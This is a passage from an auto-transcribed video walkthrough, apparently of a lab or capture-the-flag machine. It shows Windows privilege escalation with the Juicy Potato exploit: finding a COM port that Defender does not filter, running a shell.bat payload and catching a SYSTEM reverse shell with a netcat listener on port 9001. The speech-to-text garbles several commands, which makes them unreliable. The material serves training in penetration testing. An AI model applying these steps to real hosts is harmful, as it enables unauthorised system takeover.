reverse shell doesn't catch that so relatively annoying but this piece of Juicy potato um can be ran from SSH because we're not actually doing a exploit so I'm just going to go back to this shell and we'll do program data and then run this and it finds ports pretty quickly um while that works I can show you the error message we would get if um we tried juicy potato on its default Port so if we do Dash T stir p C colon uh program data shell.bat then I think that's all we need we run this do we get any error messages we get this the British process failed to communicate with the com server so that's why we have to find a different port so when we go back to that shoot put a dot this command we can find ports that Defender isn't filtering 80s in use I believe 59.85 is in use 443 was not so because 443 is open we can use this for a com port One Juicy potato and the exploit is successful but I don't think I was listening on 9001. nclvnp 9001 let's just paste this in again exploit successful and we have a shell as system so um yeah hope you guys enjoyed the video take care and I will see you all next time